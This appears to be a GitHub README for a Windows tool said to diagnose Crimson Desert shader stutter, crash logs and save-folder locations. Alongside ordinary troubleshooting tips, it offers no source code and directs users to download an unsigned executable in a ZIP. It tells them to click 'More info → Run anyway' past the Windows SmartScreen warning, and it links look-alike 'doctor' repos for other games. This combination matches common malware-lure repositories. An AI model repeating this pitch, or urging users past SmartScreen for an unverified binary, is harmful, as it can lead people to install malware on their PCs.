<p align="center">
  <img src="https://i.postimg.cc/mrWPXmMZ/banner.png" alt="Crimson Desert Shader & Frame Doctor — Shader Compilation, Stutter & Save Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Shader%20%26%20Frame%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-crimson--desert--check--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Crimson Desert Shader & Frame Doctor — Shader Compilation, Stutter & Save Checks for Windows

**Crimson Desert stuttering sharply when riding across Pywel? Shader warm-up stalling on startup, or unsure where your local save files and graphics configs are stored on Windows? Inspect your AppData caches and disk headroom first.**

Crimson Desert Shader & Frame Doctor focuses on Pearl Abyss's BlackSpace Engine behavior on Windows PC: **initial DirectX 12 shader pipeline compilation writes to `%LOCALAPPDATA%` on `C:`**, while graphics presets (`GameOption.xml`) and local save profiles reside in user profile folders separate from your Steam library.

This project is aimed at **Crimson Desert on Windows PC (Steam)**. It concerns local shader-cache directories, graphics configuration backups, crash log inspection, and save-folder discovery—not memory editing or anti-cheat bypasses.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Shader warm-up freezes or repeats on boot | Low free disk space on `C:` or corrupted `%LOCALAPPDATA%` shader cache | Check `C:` free space (20+ GB) and `%LOCALAPPDATA%\CrimsonDesert\ShaderCache` |
| Traversal stutter when riding into towns | GPU driver update invalidated DX12 PSOs or VRAM buffer saturated | Update GPU driver and verify Shader Cache Size in driver settings |
| Crash to desktop (`DXGI_ERROR_DEVICE_REMOVED`) | Driver timeout or overlay conflict during heavy combat/cutscenes | Inspect `%LOCALAPPDATA%\CrimsonDesert\CrashLogs` and disable overlays |
| Finding local save files before day-one patches | Saves stored in `%LOCALAPPDATA%` separate from Steam installation | Back up `%LOCALAPPDATA%\CrimsonDesert\SaveGames\<SteamID64>` |

## Download for Windows

[**Download CrimsonDesertCheck.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/CrimsonDesertCheck.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `CrimsonDesertCheck.exe`? (Automatic checks in ~2 seconds)

- Checks free disk headroom on drive `C:` where BlackSpace Engine writes DX12 shader caches.
- Locates `%LOCALAPPDATA%\CrimsonDesert` and inspects `ShaderCache`, `GameOption.xml`, and `CrashLogs`.
- Finds your `<SteamID64>` save directory inside `SaveGames` and reports file sizes and timestamps.
- Reports GPU model, driver version, and dedicated VRAM headroom for high-res open-world settings.

### Sample Diagnostic Output

```text
[CrimsonDesertCheck] Inspecting BlackSpace Engine caches & local saves...
[OK]   AppData Path     : C:\Users\Player\AppData\Local\CrimsonDesert
[WARN] System Drive C:  : 11.4 GB free (Recommend 20+ GB for DX12 ShaderCache)
[OK]   GameOption.xml   : Found (4.1 KB, Modified: 2026-11-19 21:14)
[INFO] CrashLogs        : 0 recent crash dumps found
[OK]   SaveGames        : SaveGames\76561198041299104 (5 save files, latest: 12.6 MB)
```

The release ZIP is named `CrimsonDesertCheck.zip`; the Windows executable inside is named `CrimsonDesertCheck.exe`.

1. Close Crimson Desert before moving or checking game files.
2. Click **Download CrimsonDesertCheck.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `CrimsonDesertCheck.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Crimson Desert and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Crimson Desert, and read access to `%LOCALAPPDATA%`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `CrimsonDesertCheck.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Shader compilation stalls or repeats on every launch

When drive `C:` has limited free space or a corrupted DX12 shader cache after a crash, BlackSpace Engine rebuilds shaders repeatedly on startup, adding minutes to initial loading screens.

### Traversal stutter and camera hitches in dense towns

Driver updates reset compiled GPU shader caches, causing temporary frame spikes while new effects compile. Exceeding dedicated VRAM with Ultra textures or Ray Tracing also forces slow system-RAM paging.

### Crash to desktop during combat or cutscenes

Inspecting local crash dumps and verifying GPU driver shader-cache limits isolates driver timeouts (`DXGI_ERROR_DEVICE_REMOVED`) from corrupted installation archives.

### Finding and backing up local Crimson Desert save files before patches

Keeping a dated offline copy of your local save folder protects your progress before applying day-one hotfixes or testing graphics settings.

## Where Crimson Desert files normally belong

On Windows PC, local shader caches, graphics options, and save directories reside inside `%LOCALAPPDATA%`:

```text
%LOCALAPPDATA%\CrimsonDesert\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\CrimsonDesert\
├── Config\
│   └── GameOption.xml
├── ShaderCache\
├── CrashLogs\
└── SaveGames\
    └── <SteamID64>\
```

If Crimson Desert is installed on a secondary SSD (`D:` or `E:`), Windows still writes DirectX and GPU driver shader caches to `%LOCALAPPDATA%` on `C:`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Crimson Desert completely.** Verify `CrimsonDesert.exe` is no longer running in Task Manager before inspecting caches or saves.
2. **Verify the latest Steam hotfix.** Open **Steam → Library → Crimson Desert → Properties → Updates** and install the newest launch patch.
3. **Check free disk space on drive `C:`.** Ensure at least 20 GB of free space on your Windows system drive for DirectX 12 and driver shader caches.
4. **Back up `SaveGames` and `GameOption.xml`.** Copy `%LOCALAPPDATA%\CrimsonDesert\SaveGames` to a dated backup folder in Documents.
5. **Check GPU shader cache settings.** Confirm Shader Cache Size is enabled (10 GB or Unlimited) in NVIDIA Control Panel or AMD Adrenalin.
6. **Verify installed files in Steam.** Run **Steam → Properties → Installed Files → Verify integrity of game files** if crashes persist.
7. **Allow initial shader warm-up to complete uninterrupted.** Let the main-menu shader pre-caching finish before loading into the open world.

### Before moving any files

Copy your entire `SaveGames` directory and `GameOption.xml` to a dated folder in Documents before clearing `ShaderCache` or testing configuration edits.

## What an effective diagnostic report should tell you

A clear diagnostic check verifies **free space on `C:`**, inspects `ShaderCache` and `GameOption.xml` timestamps, detects recent `CrashLogs`, and locates your `SaveGames` folder.

## FAQ

**Where are Crimson Desert save files located on Windows?**

On Steam Windows setups, local saves are stored under `%LOCALAPPDATA%\CrimsonDesert\SaveGames\<SteamID64>\`.

**Why does Crimson Desert stutter during the first 15 minutes of play?**

DirectX 12 compiles shaders dynamically when encountering new regions and combat effects, especially right after a GPU driver update.

**Is it safe to clear the Crimson Desert shader cache?**

Yes—after backing up your saves and configs, clearing a corrupted `ShaderCache` forces the game to compile clean shaders on next launch.

**Where is Crimson Desert's graphics config file stored?**

Inside `%LOCALAPPDATA%\CrimsonDesert\Config\GameOption.xml`.

**Can this tool unlock items or edit character stats?**

No. It performs local file, cache, and configuration diagnostics only.

**Are any game files or copyrighted assets bundled here?**

No game binaries, save files, or copyrighted assets are included in this repository.

## Useful reading

- [Crimson Desert Official Website (Pearl Abyss)](https://crimsondesert.pearlabyss.com/)
- [Crimson Desert on Steam](https://store.steampowered.com/search/?term=Crimson+Desert)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [Fable2026-ShaderCrashGuard](../Fable2026-ShaderCrashGuard) — Fable (2026) ForzaTech shader optimization & crash guard
- [DeathStranding2-PCCacheDoctor](../DeathStranding2-PCCacheDoctor) — Death Stranding 2 PC Decima shader cache & save doctor
- [MHWilds-ShaderFrameDoctor](../MHWilds-ShaderFrameDoctor) — Monster Hunter Wilds `shader.cache2` & VRAM check

*Independent community project. Not affiliated with Pearl Abyss, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
 
